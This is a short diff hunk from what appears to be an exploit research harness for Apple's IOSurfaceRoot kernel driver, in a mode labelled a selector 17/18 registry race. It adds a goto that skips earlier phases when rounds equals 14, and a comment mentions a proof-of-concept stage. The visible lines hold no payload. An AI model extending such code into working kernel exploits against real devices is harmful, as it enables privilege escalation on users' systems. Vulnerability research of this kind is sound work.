@@ -16855,6 +16855,12 @@ new_modes:
         rlog("=== IOSURFACE_SEL17: Raw selector 17/18 registry race ===\n");
         rlog("rounds=%d\n\n", rounds);
 
+        /* Fast-path: skip all earlier phases when rounds==14 */
+        if (rounds == 14) {
+            rlog("*** rounds=14: fast-path to Phase 14 ***\n");
+            goto phase13_done;
+        }
+
         /* Open IOSurfaceRoot user client */
         io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
             IOServiceMatching("IOSurfaceRoot"));
@@ -18981,6 +18987,8 @@ new_modes:
         }
         phase12_done:
         rlog("--- Phase 12 complete ---\n");
+
+        /* (rounds==14 fast-path handled at top of mode) */
 
         /*
          * Phase 13: Full PoC Stage C+D — Metal render loop + race variants
